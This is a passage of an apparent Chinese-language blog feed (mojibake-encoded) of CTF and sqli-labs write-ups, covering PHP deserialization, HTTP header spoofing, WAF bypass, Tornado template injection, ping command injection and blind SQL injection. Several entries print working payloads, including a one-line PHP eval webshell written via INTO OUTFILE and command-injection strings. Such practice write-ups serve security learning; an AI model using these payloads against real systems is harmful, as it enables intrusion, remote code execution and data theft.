title="è§£"></a>è§£</h3><p>payloadï¼š<code>?select=O%3A4%3A&quot;Name&quot;%3A4%3A&#123;s%3A14%3A&quot;%00Name%00username&quot;%3Bs%3A5%3A&quot;admin&quot;%3Bs%3A14%3A&quot;%00Name%00password&quot;%3Bi%3A100%3B&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/01/9362857e700a46b0.png">      </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p><strong>phpåºåˆ—åŒ–ä¸ååºåˆ—åŒ–</strong>          </p><blockquote><p>æ‰€æœ‰phpé‡Œé¢çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨å‡½æ•°serialize()æ¥è¿”å›ä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²æ¥è¡¨ç¤ºã€‚unserialize()å‡½æ•°èƒ½å¤Ÿé‡æ–°æŠŠå­—ç¬¦ä¸²å˜å›phpåŸæ¥çš„å€¼ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¼šä¿å­˜ç±»çš„åå­—ã€‚<br>æœ¬é¢˜ä¸­åºåˆ—åŒ–å<code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code>  Oè¡¨ç¤ºå­˜å‚¨çš„å¯¹è±¡ï¼ˆobjectç±»å‹ï¼‰ï¼›4ä»£è¡¨å¯¹è±¡åç§°æœ‰å››ä¸ªå­—ç¬¦ï¼Œå³nameï¼›2è¡¨ç¤ºæœ‰ä¸¤ä¸ªå€¼usernameå’Œpasswordï¼›sä»£è¡¨stringç±»å‹ï¼›14ä»£è¡¨å­—ç¬¦ä¸²é•¿åº¦ï¼›iä»£è¡¨intç±»å‹ï¼›æ•°å€¼ä¸º100ã€‚<br><strong>ä¸åŒå±æ€§åºåˆ—åŒ–åçš„æ ¼å¼</strong><br>privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯ %00ç±»å%00æˆå‘˜å å¦‚testname ï¼ˆtest-&gt;ç±»åname-&gt;æˆå‘˜åï¼‰ï¼›æ¯”å¦‚æœ¬é¢˜ä¸­ï¼Œ<code>nameusername</code>æ˜¯12ä¸ªå­—æ¯ï¼Œä½†å‰é¢æ•°å­—æ˜¯14ï¼Œå°±æ˜¯å› ä¸ºnameå’Œusernameå‰é¢å„æœ‰ä¸€ä¸ªç©ºå­—ç¬¦ï¼Œurlç¼–ç ä¸º<code>%00</code>;phpçš„<code>urlencode</code>å‡½æ•°å¯ä»¥å°†ç©ºå­—ç¬¦ç¼–å‡ºã€‚<br>protectedå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯<code> %00*%00</code>æˆå‘˜å å¦‚<code>*name </code>ï¼ˆname-&gt;æˆå‘˜å)<br><strong>é­”æ³•å‡½æ•°</strong><br><code>__construct</code> å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨<br><code>__destruct</code> å½“å¯¹è±¡è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ (phpç»å¤§å¤šæ•°æƒ…å†µä¸‹ä¼šè‡ªåŠ¨è°ƒç”¨é”€æ¯å¯¹è±¡)<br><code>__wakeup </code>ä½¿ç”¨**unserialse()**å‡½æ•°æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨<br><strong>wakeupå‡½æ•°ç»•è¿‡</strong><br>wakeup()æ¼æ´å°±æ˜¯ä¸æ•´ä¸ªå±æ€§ä¸ªæ•°å€¼æœ‰å…³ã€‚å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œã€‚</p></blockquote><p><a href="https://blog.csdn.net/m0_46383107/article/details/109770976">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜010</title>
    <link href="/2021/01/24/BUU010/"/>
    <url>/2021/01/24/BUU010/</url>
    
    <content type="html"><![CDATA[<h2 id="åã€"><a href="#åã€" class="headerlink" title="åã€"></a>åã€</h2><ul><li>é¢˜ç›®ï¼š[æå®¢å¤§æŒ‘æˆ˜ 2019]Http<br>æ‰“å¼€ç½‘é¡µ    <img src="https://ftp.bmp.ovh/imgs/2021/01/48773f6455d50f52.png"></li><li>è§£<br>åœ¨æºç ä¸­å‘ç°<code>Secret.php</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/b363b77c699739bc.png"><br>burpæŠ“åŒ…ï¼ŒåŠ ä¸Š<code>Referer:    https://www.Sycsecret.com</code>å€¼å¾—æ³¨æ„çš„æ˜¯<code>:</code>å’Œ<code>https://www.Sycsecret.com</code>ä¸­é—´è¦æœ‰å››ä¸ªç©ºæ ¼<br><img src="https://ftp.bmp.ovh/imgs/2021/01/458f225deefe3ba1.png"><br>æç¤ºè¦ç”¨<code>Syclover</code>è®¿é—®ï¼Œå°†firefoxæ”¹ä¸ºSyclover<br><img src="https://ftp.bmp.ovh/imgs/2021/01/aa2a208a708a3cd6.png"><br>è¦åœ¨æœ¬åœ°æ‰å¯è®¿é—®ï¼Œå°†IPåœ°å€æ”¹ä¸º<code>127.0.0.1</code><img src="https://ftp.bmp.ovh/imgs/2021/01/305c71705fdf6cee.png"><br>å¾—åˆ°flag          </li><li>çŸ¥è¯†ç‚¹<br>å‡ ä¸ªå¸¸è§è¯·æ±‚å¤´       <blockquote><p><code>Referer</code>:å‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„<br><code>X-Forwarded-For </code>:ç”¨æ¥è¡¨ç¤º HTTP è¯·æ±‚ç«¯çœŸå® IP<br><code>User-Agent:Mozilla/...</code>å‘Šè¯‰HTTPæœåŠ¡å™¨ï¼Œ å®¢æˆ·ç«¯ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿå’Œæµè§ˆå™¨çš„åç§°å’Œç‰ˆæœ¬<br><code>Cookie</code>ç”¨æ¥å­˜å‚¨ä¸€äº›ç”¨æˆ·ä¿¡æ¯ä»¥ä¾¿è®©æœåŠ¡å™¨è¾¨åˆ«ç”¨æˆ·èº«ä»½çš„<br><code>Cache-Control:max-age=10</code> æ˜¯é€šçŸ¥æµè§ˆå™¨10ç§’ä¹‹å†…ä¸è¦çƒ¦æˆ‘ï¼Œè‡ªå·±ä»ç¼“å†²åŒºä¸­åˆ·æ–°<br><code>Content-Type</code>:å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œèµ„æºæ–‡ä»¶çš„ç±»å‹ï¼Œè¿˜æœ‰å­—ç¬¦ç¼–ç <br><code>Data</code>:æœåŠ¡ç«¯å‘é€èµ„æºæ—¶çš„æœåŠ¡æ—¶é—´<br><code>Server</code>:æœåŠ¡å™¨å’Œç›¸å¯¹åº”çš„ç‰ˆæœ¬<br><code>Connection</code>:keep-aliveå‘Šè¯‰å®¢æˆ·ç«¯æœåŠ¡å™¨çš„tcpè¿æ¥æ˜¯ä¸€ä¸ªé•¿è¿æ¥            </p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU009</title>
    <link href="/2021/01/23/BUU009/"/>
    <url>/2021/01/23/BUU009/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¹ã€"><a href="#ä¹ã€" class="headerlink" title="ä¹ã€"></a>ä¹ã€</h2><ul><li>é¢˜ç›®ï¼š[RoarCTF 2019]Easy Calc<br>æ‰“å¼€é¶åœºï¼Œä¸€ä¸ªç®€å•çš„è®¡ç®—å™¨ï¼Œåœ¨æºä»£ç ä¸­å‘ç°ä¸€äº›ä¸œè¥¿<br><img src="https://ftp.bmp.ovh/imgs/2021/01/b4957385a1f70127.png"><br>WAFå’Œcalc.php,è®¿é—®calca.php<br><img src="https://ftp.bmp.ovh/imgs/2021/01/f7627cb41a97cb9f.png"></li><li>åˆ†æ<br>æœ¬æ¥ä»¥ä¸ºæ˜¯ä¸ªç®€å•çš„å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯æˆ‘é”™äº†ï¼Œè¾“å…¥numçš„å€¼ï¼Œå‘ç°ä¸èƒ½è¾“å…¥å­—æ¯ï¼Œåªèƒ½æ˜¯æ•°å­—æˆ–è€…è¿ç®—ç¬¦ï¼Œæ‰ä¼šæœ‰å›æ˜¾ï¼Œ<code>WAF</code><br>çœ‹äº†åˆ«äººçš„wpè¯´numå‰åŠ æ‹¬å·å¯ä»¥ç»•è¿‡<br>ç„¶åè¾“å…¥<code> num=system(chr(39).ls.chr(39))</code>ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œçœ‹äº†ä¸‹<code> num=phpinfo()</code>å‘ç°systemå’Œå…¶ä»–ä¸€äº›å‡½æ•°è¢«ç¦äº†,ä½¿ç”¨scandir,è¿‡æ»¤çš„å­—ç¬¦å¯ä»¥ç”¨chrç¼–ç          </li><li>è§£<br><code> num=var_dump(scandir(chr(47)))</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/84d49bb08cefae0b.png"><br>æ‰“å¼€f1aggï¼š<code>? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>å¾—åˆ°flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/d884c9d3fdbf9cb9.png">                  </li><li>çŸ¥è¯†ç‚¹         </li><li>*å‡ ä¸ªå‡½æ•°ï¼š**      <blockquote><p><code>scandir</code> â€” åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•,è¿”å›ä¸€ä¸ªæ•°ç»„<br><code>file_get_contents</code> â€” å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²<br><code>var_dump</code> â€” æ‰“å°å˜é‡çš„ç›¸å…³ä¿¡æ¯        </p></blockquote></li></ul><p><strong>WAF</strong>      </p><blockquote><p>Web Application Firewall<br>Webåº”ç”¨é˜²ç«å¢™æ˜¯é€šè¿‡æ‰§è¡Œä¸€ç³»åˆ—é’ˆå¯¹HTTP/HTTPSçš„å®‰å…¨ç­–ç•¥æ¥ä¸“é—¨ä¸ºWebåº”ç”¨æä¾›ä¿æŠ¤çš„ä¸€æ¬¾äº§å“ã€‚         </p></blockquote><p><strong>PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</strong>         </p><blockquote><p>PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨<code>$_GET</code>æˆ–çš„å…³è”æ•°ç»„<code>$_POST</code>ã€‚ä¾‹å¦‚ï¼š<code>/?foo=bar</code>å˜æˆ<code>Array([foo] =&gt; &quot;bar&quot;)</code>ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚ä¾‹å¦‚ï¼Œ<code>/?%20news[id%00=42</code>ä¼šè½¬æ¢ä¸º<code>Array([news_id] =&gt; 42)</code>ã€‚<br>åœ¨æœ¬é¢˜ä¸­åˆ©ç”¨ç©ºæ ¼ï¼Œå˜é‡<code>num</code>å˜æˆäº†<code>ç©ºæ ¼num</code>ï¼ŒWAFæ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡ï¼Œä¹Ÿå°±ä¸èµ·ä½œç”¨äº†ï¼Œè€Œå˜é‡è¿›å…¥åˆ°PHPè¯­å¥ä¸­ï¼Œç©ºæ ¼ä¼šè¢«åˆ é™¤       </p></blockquote><p>å¦å¤–ï¼Œè¿™é“é¢˜è¿˜å¯ä»¥ç”¨httpèµ°ç§æ”»å‡»ï¼Œä½†æä¸æ‡‚      </p><p><code>tbl</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buuæ¯æ—¥ä¸€é¢˜008</title>
    <link href="/2021/01/22/Buu008/"/>
    <url>/2021/01/22/Buu008/</url>
    
    <content type="html"><![CDATA[<h2 id="å…«ã€"><a href="#å…«ã€" class="headerlink" title="å…«ã€"></a>å…«ã€</h2><ul><li>é¢˜ç›®ï¼š[æŠ¤ç½‘æ¯ 2018]easy_tornado<br><img src="https://ftp.bmp.ovh/imgs/2021/01/dda44cc856f68e99.png">        </li><li>åˆ†æ<br>ä¸‰ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€å<img src="https://ftp.bmp.ovh/imgs/2021/01/a8795c859978059a.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/01/f58ca7b8ec5ab046.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/01/4611fedc253b2ebd.png"><br>ç¬¬ä¸€ä¸ªç»™äº†flagæ‰€åœ¨çš„æ–‡ä»¶<br>ç¬¬äºŒä¸ªrenderæ˜¯æ¸²æŸ“çš„æ„æ€ï¼Œä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨<br>çš„ä¸‰ä¸ªhintæ˜¯æç¤ºçš„æ„æ€<code>file?filename=/flag.txt&amp;filehash=3d518951e756f5b32ac20ed58cd605d6</code>æç¤ºçš„æ˜¯åé¢filehashçš„åŠ å¯†æ–¹å¼å§ï¼Œæ‰€ä»¥ç°åœ¨è¦æ‰¾åˆ°cookie_secretäº†<br>å…¶å®ä¸€å¼€å§‹ä¸çŸ¥é“è¿™é“é¢˜æ˜¯ä»€ä¹ˆæ„æ€ï¼Œè¯•å›¾è®¿é—®<br>fllllllllllllagï¼Œå‡ºç°äº†æŠ¥é”™çš„é¡µé¢<img src="https://ftp.bmp.ovh/imgs/2021/01/7ccf51202666afbb.png"><br>urlä¸­çš„<code>msg=Error</code>å’Œé¡µé¢æ˜¾ç¤ºçš„ä¸€æ ·ï¼Œæ”¹æˆ123çš„è¯é¡µé¢ä¹Ÿèƒ½è·Ÿç€å˜ï¼Œæ‰€ä»¥ç”¨è¿™ä¸ªå¾—åˆ°cookie_secretï¼Œä½†ä¸æ˜¯ç›´æ¥è®¿é—®ï¼Œè€Œæ˜¯<code>error?msg=&#123;&#123;handler.settings&#125;&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/01/db67ed2001e1f9a1.png"><br>æ¥ä¸‹æ¥æŒ‰hint.txtä¸­åŠ å¯†å³å¯            </li><li>è§£<br>payloadï¼š<code> file?filename=/fllllllllllllag&amp;filehash=06d6f09671ddf3eb27de7e2ef86a5d05</code> å¾—åˆ°flag<img src="https://ftp.bmp.ovh/imgs/2021/01/c2696ad17fea66f3.png">    </li><li>çŸ¥è¯†ç‚¹      </li><li>*tornado**       <blockquote><p>Tornado æ˜¯ä¸€ä¸ªPythonç½‘ç»œæ¡†æ¶ï¼Œ å¼‚æ­¥ç½‘ç»œåº“ï¼Œæœ€åˆç”± å¼€å‘ FriendFeed ã€‚ é€šè¿‡ä½¿ç”¨éé˜»å¡ç½‘ç»œI / Oï¼ŒTornado å¯ä»¥æ‰©å±•åˆ°æˆåƒä¸Šä¸‡çš„å¼€æ”¾è¿æ¥ï¼Œéå¸¸é€‚åˆ é•¿è½®è¯¢ ï¼Œ WebSockets ç­‰ éœ€è¦ä¸æ¯ä¸ªç”¨æˆ·ä¿æŒé•¿æœŸè¿æ¥çš„åº”ç”¨ç¨‹åºã€‚       </p></blockquote></li></ul><blockquote><p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡,è¿™é‡Œç”¨åˆ°çš„æ˜¯handler.settingsï¼Œhandler æŒ‡å‘RequestHandlerï¼Œè€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settingsï¼Œæ‰€ä»¥handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼Œè¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬çš„ä¸€äº›ç¯å¢ƒå˜é‡              </p></blockquote><blockquote><p>çœ‹åˆ«äººè¯´è¿™ä¸ªå«åš<strong>æ¨¡æ¿æ³¨å…¥</strong><br>å„ç§ä¸œè¥¿å§ï¼Œçœ‹äº†ä¸€ä¸‹åˆä¹Ÿä¸ç†è§£ï¼Œå“  ,tbl<br><a href="https://www.tornadoweb.org/en/latest/guide/security.html?highlight=cookie_secret#cookies-and-secure-cookies">MORE</a>               </p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Level9</title>
    <link href="/2021/01/21/level9/"/>
    <url>/2021/01/21/level9/</url>
    
    <content type="html"><![CDATA[<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>GET-Blind-Time based-Single-Quotes<br>åŸºäºæ—¶é—´çš„å¸ƒå°”ç›²æ³¨-å•å¼•å·<br>ä¸¤ä¸ªå‡½æ•°ï¼š      </p><blockquote><p><code>sleep()</code>:å»¶é•¿è¯­å¥è¿è¡Œæ—¶é—´ï¼Œå¦‚ï¼šsleep(n)è¿è¡Œnç§’<br><code>IF(expr,v1,v2)</code>:å¦‚æœè¡¨è¾¾å¼ expr æˆç«‹ï¼Œè¿”å›ç»“æœ v1ï¼›å¦åˆ™ï¼Œè¿”å›ç»“æœ v2ã€‚</p></blockquote><p>level9ä¸­ä¸è®ºè¾“å…¥çš„è¯­å¥æ­£ç¡®ä¸å¦ï¼Œè¾“å‡ºåªæœ‰<code>You are in....</code>æ‰€ä»¥ä¸èƒ½ä»…æ ¹æ®å¸ƒå°”ç›²æ³¨ï¼Œå¸ƒå°”ç›²æ³¨éœ€è¦ä¸¤ä¸ªè¿”å›ï¼Œæ²¡æœ‰æ¡ä»¶å¯ä»¥ä½¿ç”¨<code>IF(expr,v1,v2)</code>åˆ›é€ æ¡ä»¶ï¼Œåªè¦å°†å¸ƒå°”è¯­å¥å¡«å…¥åˆ°<code>expr</code>ä¸­å³å¯ã€‚                  </p><ul><li>å¼€å§‹æ³¨å…¥<br><code>?id=1&#39;and if(length(database())&gt;0,sleep(5),0)%23</code>å¦‚æœæ•°æ®åº“çš„é•¿åº¦å¤§äº0ï¼Œå»¶è¿Ÿäº”ç§’ï¼Œå¦åˆ™è¿”å›0<br><img src="https://ftp.bmp.ovh/imgs/2021/01/d79de8d29be38904.png"><br><code>?id=1&#39;and if(ascii(substr(database(),1,1))&gt;97,sleep(5),0)%23</code>åº“åçš„ï¼ˆç¬¬ä¸€ä¸ªï¼‰å­—æ¯<br><code>?id=1&#39;and if((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;0,sleep(5),0)%23</code>ç¬¬ä¸€ä¸ªè¡¨åçš„é•¿åº¦<br><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><a href="https://lll-nnn.github.io/2021/01/19/level5/">å…·ä½“è§</a> </li></ul><hr><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>GET-Blind-Time based-double quotes<br>åŸºäºæ—¶é—´çš„ç›²æ³¨â€“åŒå¼•å·<br>ç›¸è¾ƒäºlevel9ï¼Œå•å¼•å·æ”¹ä¸ºåŒå¼•å·<br>æµ‹è¯•<code>?id=1&quot; and if(length(database())&gt;1,sleep(7),0)%23</code>æ­£å¸¸å»¶è¿Ÿ</p><hr><h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><p>å¦‚æœé‡åˆ°è¿™æ ·çš„é¢˜çš„è¯ï¼Œå› ä¸ºä¸æŠ¥é”™ï¼Œåªæœ‰ä¸€ä¸ªå›æ˜¾ï¼Œæ‰€ä»¥åªèƒ½æ ¹æ®ifè¯­å¥çœ‹ååº”åˆ¤æ–­é—­åˆæ–¹å¼ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Level7</title>
    <link href="/2021/01/21/level7/"/>
    <url>/2021/01/21/level7/</url>
    
    <content type="html"><![CDATA[<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>GET-Dump into outfile-String<br>å¯¼å‡ºæ–‡ä»¶GETå­—ç¬¦å‹æ³¨å…¥     </p><ul><li><p>ç›¸å…³çŸ¥è¯†ç‚¹      </p><blockquote><p>select into outfileå‘½ä»¤ä½œç”¨å°†æŸ¥è¯¢ç»“æœè¾“å‡ºä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­<br>å†™å…¥ä¸€å¥è¯è¯­å¥ï¼š<code>select â€œ&lt;?php @eval($_POST[&#39;giantbranch&#39;]);?&gt;â€ into outfile â€œXXX\test.phpâ€</code><br>éœ€è¦çŸ¥é“ç»å¯¹è·¯å¾„<br>éœ€è¦åœ¨MySQLç›®å½•ä¸‹çš„<code>my.in</code>æ–‡ä»¶ä¸­æ·»åŠ <code>secure_file_priv= &quot;&quot;</code>ï¼Œç„¶åé‡å¯mysqlã€‚<br><code>secure_file_priv=null</code>: ä¸å…è®¸csvæ–‡ä»¶çš„å¯¼å…¥å¯¼å‡º<br><code>secure_file_priv=xxx</code>: csvæ–‡ä»¶å¯¼å…¥å¯¼å‡ºåˆ°æŸè·¯å¾„<br><code>secure_file_priv=/ </code>:csvæ–‡ä»¶å¯å¯¼å…¥åˆ°ä»»æ„è·¯å¾„        </p></blockquote></li><li><p>è”ç³»<br>å°†è‡ªå·±MySQLä¸‹çš„my.inä¿®æ”¹åï¼Œé‡å¯ï¼Œlevel7ä¸­è¾“å…¥<code>?id=-1&#39;))%20 union select 1,2,&#39;&lt;?php eval($_REQUEST[&quot;a&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\test.php&quot;%23</code>,åœ¨ç›®å½•ä¸‹äº§ç”Ÿäº†test.php<img src="https://ftp.bmp.ovh/imgs/2021/01/153f4103dc13dacc.png"><br>éš¾å—çš„æ˜¯èšå‰‘è¿ä¸ä¸Šï¼Œä¸çŸ¥é“å’‹å›äº‹ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜007</title>
    <link href="/2021/01/21/BUU007/"/>
    <url>/2021/01/21/BUU007/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸ƒã€"><a href="#ä¸ƒã€" class="headerlink" title="ä¸ƒã€"></a>ä¸ƒã€</h2><ul><li>é¢˜ç›®ï¼š[ACTF2020 æ–°ç”Ÿèµ›]Exec<br><img src="https://ftp.bmp.ovh/imgs/2021/01/3d1a38e39bff6cb0.png">    </li><li>åˆ†æ<br>å’Œæ˜¨å¤©ä¸€æ ·ï¼Œåˆæ˜¯ä¸€é“pingçš„é¢˜ç›®ï¼Œ<code>;ls</code>ä¸€ä¸‹ï¼Œå‘ç°ä¸€ä¸ª<code>index.php</code>ï¼Œå†è¯•ä¸€ä¸‹<code>;ls -a</code>ä¹Ÿæ²¡æœ‰flagç›¸å…³çš„ï¼Œè¿™é“é¢˜ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤å•Šï¼ŒæŸ¥çœ‹æ ¹ç›®å½•å§<code>ls /</code>,å‘ç°flagæ–‡ä»¶<img src="https://ftp.bmp.ovh/imgs/2021/01/9e0031abde862323.png"><br>ä¹‹åcatå¾—åˆ°flagã€‚          </li><li>è§£<br><code>payloadï¼šcat /flag</code><img src="https://ftp.bmp.ovh/imgs/2021/01/455302e4fdf00d14.png"></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜006</title>
    <link href="/2021/01/20/BUU006/"/>
    <url>/2021/01/20/BUU006/</url>
    
    <content type="html"><![CDATA[<h2 id="å…­ã€"><a href="#å…­ã€" class="headerlink" title="å…­ã€"></a>å…­ã€</h2><ul><li>é¢˜ç›®ï¼š[GXYCTF2019]Ping Ping Ping<br><img src="https://ftp.bmp.ovh/imgs/2021/01/0e8930c04d1c8c22.png">   </li><li>åˆ†æ<br>lsä¸€ä¸‹ï¼Œå¾—åˆ°å¯èƒ½å«æœ‰flagçš„æ–‡ä»¶<br><img src="https://ftp.bmp.ovh/imgs/2021/01/9c0e86bdd2f60fbf.png"><br>pingçš„å‘½ä»¤æ‰§è¡Œï¼Œç»æ£€éªŒï¼Œç©ºæ ¼å’Œ<code>flag</code>è¢«è¿‡æ»¤<br>ç©ºæ ¼å¯ä»¥ç”¨<code>$IFS</code>ä»£æ›¿ï¼›flagå¯ä»¥ç”¨å˜é‡æ‹¼æ¥ç»•è¿‡         </li><li>è§£     </li><li>*payloadï¼š**<code>/?ip=127.0.0.1;a=ag.php;b=fl;cat$IFS$b$a</code>å¾—åˆ°flag<img src="https://ftp.bmp.ovh/imgs/2021/01/7d3e88cdfb0a1e8e.png"><br>å¦å¤–<code>/?ip=127.0.0.1;cat$IFS`ls` </code>å†…è”æ‰§è¡Œï¼Œåå¼•å·å†…çš„è¾“å‡ºå¯ä»¥ä½œä¸ºå‰é¢å‘½ä»¤çš„è¾“å…¥ï¼Œä¸Šé¢çš„<code>cat$IFS`ls```=</code> cat flag.php;cat index.php``å¾—åˆ°ï¼š<img src="https://ftp.bmp.ovh/imgs/2021/01/404e14d9ad638b74.png">         </li><li>çŸ¥è¯†ç‚¹<br>äº§ç”ŸåŸå› ï¼š      <blockquote><p>å½“åº”ç”¨éœ€è¦è°ƒç”¨ä¸€äº›å¤–éƒ¨ç¨‹åºå»å¤„ç†å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šç”¨åˆ°ä¸€äº› æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚å¦‚æœç”¨æˆ·å¯ä»¥æ§åˆ¶å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œ å°±å¯ä»¥æ³¨å…¥ä¸€äº›æ¶æ„çš„ç³»ç»Ÿå‘½ä»¤åˆ°æ­£å¸¸å‘½ä»¤ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´          </p></blockquote></li></ul><p>å‡ ä¸ªç¬¦å·     </p><blockquote><p><code>;</code><br>å¤šæ¡å‘½ä»¤æ‰§è¡Œ<br><code>|</code><br>ç®¡é“ç¬¦ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤å‚æ•°ã€‚ctfé‡Œé¢ï¼šping 127.0.0.1 | ls(åªæ‰§è¡Œlsä¸æ‰§è¡Œå‰é¢çš„ï¼‰æœ¬é¢˜<code>?ip=127.0.0.1|ls</code>åªä¼šè¾“å‡º<code>flag.php  index.php</code><br><code>&amp;</code><br><code>?ip=127.0.0.1&amp;ls</code>å…ˆæ‰§è¡Œlsåæ‰§è¡Œpingï¼Œä½†åœ¨é¢˜ä¸­è¯•äº†ä¸‹ï¼Œè¾“å‡ºçš„æ˜¯pingçš„ç»“æœï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ<br><code>&amp;&amp;</code><br><code>?ip=127.0.0.1&amp;&amp;ls</code>pingå‘½ä»¤æ­£ç¡®æ‰æ‰§è¡Œls<br><code>||</code><br>ä¸&amp;&amp;ç›¸åï¼Œé€»è¾‘æˆ–çš„åŠŸèƒ½       </p></blockquote><p>ä¸€äº›ç»•è¿‡       </p><blockquote><p>ç©ºæ ¼     </p><blockquote><p>{cat,flag.php}<br>${IFS}<br>$IFS$9<br>$IFS$1<br><code>&lt;</code><br><code>&lt;&gt;</code><br>\x20 </p></blockquote></blockquote><blockquote><p>å†…è”æ‰§è¡Œ     </p><blockquote><p>``cat$IFS`ls```               </p></blockquote></blockquote><p><a href="https://www.cnblogs.com/Tkitn/p/11661017.html">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Level5</title>
    <link href="/2021/01/19/level5/"/>
    <url>/2021/01/19/level5/</url>
    
